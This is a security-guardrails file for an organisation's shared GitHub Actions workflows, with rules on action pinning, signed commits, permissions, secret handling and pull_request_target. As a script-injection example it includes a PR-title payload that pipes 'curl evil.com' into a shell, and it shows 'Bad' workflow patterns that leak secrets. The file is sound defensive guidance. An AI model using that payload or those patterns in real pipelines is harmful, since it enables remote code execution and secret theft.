# SECURITY-GUARDRAILS.md — babylonlabs-io/.github

This repo hosts **org-wide reusable workflows** consumed by dozens of downstream
repos via `uses: babylonlabs-io/.github/.github/workflows/<x>.yml@<ref>`. A merge to
`main` ships immediately to any downstream pinning a floating ref — **every workflow
change is a supply-chain change** and runs with **downstream secrets / machine
identity**. Obey the rules below before touching anything under `.github/workflows/`.

`Enforced by:` names a guard that runs in CI on this repo's `origin/main` and fails
the build on violation. Everything under **Conventions (not yet CI-enforced)** is a
review-time obligation with no automated gate — hold the line manually.

---

## CI-enforced

### Always pin every `uses:` to a full 40-hex commit SHA
Always: pin to a 40-char SHA with a trailing `# vX.Y.Z` comment (or the DevOps-approved `# unversioned` sentinel); never a tag (`@v4`) or branch (`@main`).
Bad:  `uses: actions/checkout@v6`
Good: `uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2`
Enforced by: `.github/workflows/reusable_check_pinned_actions.yml` (runs on every PR: rejects non-40-hex refs, missing version comment, `main`/`master`, and SHAs that no longer match what the tag resolves to on GitHub — the force-pushed-tag / `tj-actions/changed-files`-class attack). No `actions/*` exception.

### Always sign PR commits with an allow-listed FIDO2 SSH key
Always: sign every commit with an SSH key in `vars.BABYLON_ALLOWED_SIGNERS` (`sk-ssh-ed25519`, FIDO2); the only exemption is Dependabot, gated on immutable user ID `49699333` + type `Bot`, not `github.actor`.
Bad:  push an unsigned commit onto a PR branch, or check `github.actor == 'dependabot[bot]'`.
Good: commit signed by your hardware key; bot exemption keyed on `github.event.pull_request.user.id`.
Enforced by: `.github/workflows/reusable_authenticate_commits.yml` (runs on every PR via org ruleset; verifies signatures through the Commits API).

---

## Conventions (not yet CI-enforced)

No `actionlint`, `zizmor`, or `gitleaks` runs against this repo's own workflows today
(the `actionlint`/`yq`/`awk` commands in `AGENTS.md` "Pre-merge checks" are a manual
checklist, not a CI gate). The rules below are therefore review-enforced — run the
`AGENTS.md` pre-merge greps before every workflow change.

### Never interpolate untrusted `${{ … }}` inside a `run:` body
Always: assign the expression to an `env:` var and reference `"$VAR"` (quoted). GitHub substitutes `${{ }}` before the shell parses, so a PR title of `"; curl evil.com | sh; #` becomes executable. Applies to **all** of `inputs.*`, `github.event.*.*` (titles, branches, bodies), `vars.*`, `secrets.*`, `needs.*.outputs.*`, `matrix.*`. The only `${{ }}` allowed in a step's `run:` is the step's own `if:`.
Bad:  `run: echo "Building ${{ inputs.repoName }} on ${{ github.event.pull_request.head.ref }}"`
Good: `env: { REPO: "${{ inputs.repoName }}", HEAD_REF: "${{ github.event.pull_request.head.ref }}" }` then `run: echo "Building $REPO on $HEAD_REF"`
Check on edit: `AGENTS.md` pre-merge check #3 (`yq` authoritative / `awk` fallback) lists every `run:` containing `${{`. Fixed repo-wide in PR #76.

### Always declare a top-level `permissions:` block; default read-only, elevate per job
Always: set `permissions: {}` (or `contents: read`) at workflow top level, then grant the minimum scope on the specific job that needs it. Omitting the top-level block inherits the repo/caller default token (`read-all`/`write-all`) — unsafe. Never widen "to fix a 403" without diagnosing root cause (usually a wrong trigger or missing OIDC role, not token scope).
Bad:  workflow with no top-level `permissions:` and a job using `contents: write`.
Good: `permissions: {}` at top; `jobs.publish.permissions: { id-token: write, contents: read }`.
Check on edit: `AGENTS.md` pre-merge check #5 flags any workflow missing a top-level `permissions:` line.

### Never echo, log, or `toJSON` a secret; gate privileged jobs behind an environment
Always: reference secrets only via `${{ secrets.* }}` passed into an action input or an `env:` var, mask multi-value blobs with `::add-mask::`, and confirm presence with `echo "${#SECRET}"` (length) — never the value. Any job that mints/uses privileged machine identity (`id-token: write` OIDC, release/publish, org-secret access) must run under a GitHub `environment:` with **required reviewers** so a compromised PR cannot silently exercise it. Never `secrets: inherit` in a workflow reusable outside the org — prefer named secrets.
Bad:  `run: echo "token=${{ secrets.GO_PRIVATE_TOKEN }}"` or `run: echo '${{ toJSON(secrets) }}'`, or an `id-token: write` publish job with no `environment:`.
Good: `run: echo "token length: ${#GO_PRIVATE_TOKEN}"` with the value only in `env:`; publish job declares `environment: release` (required reviewers configured in repo settings).
Check on edit: grep the diff for `echo`/`printf`/`set -x` on any step touching a secret and for `toJSON(secrets`; confirm each `id-token: write` / release job has an `environment:`. Note: `environment` required-reviewer gating is a GitHub **repo/environment setting**, not visible in the YAML — verify it exists in repo settings, don't assume the `environment:` key alone enforces review.

### Never checkout + execute untrusted PR-head code with secrets (`pull_request_target` / `workflow_run`)
Always: default answer to "add `pull_request_target`" is **no**. It (and `workflow_run` after a `pull_request`) runs with **write access to org secrets even for fork PRs**. If a step needs the fork's head code (lint/test/build), use plain `pull_request` and accept that secrets are unavailable. The only allowed `pull_request_target` today is `reusable_backport.yml`, which operates on the already-**merged** base commit (gated on `github.event.pull_request.merged`) and runs no PR code.
Bad:  `on: pull_request_target` + `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` followed by `make`/`npm`/a third-party action.
Good: `on: pull_request` for anything that executes PR-head code; `pull_request_target` only for metadata operations on the merged base, never checking out or running head code. When checking out with a token later exposed to third-party actions or PR-head scripts, set `persist-credentials: false`.
Check on edit: `AGENTS.md` pre-merge check #4 greps for any `pull_request_target`; require explicit `@babylonlabs-io/devops` review and a documented reason for each occurrence.

---

Deeper rationale, the full permissions table, and the pre-merge command block live in
[AGENTS.md](./AGENTS.md). When the two ever disagree, this file wins for security.
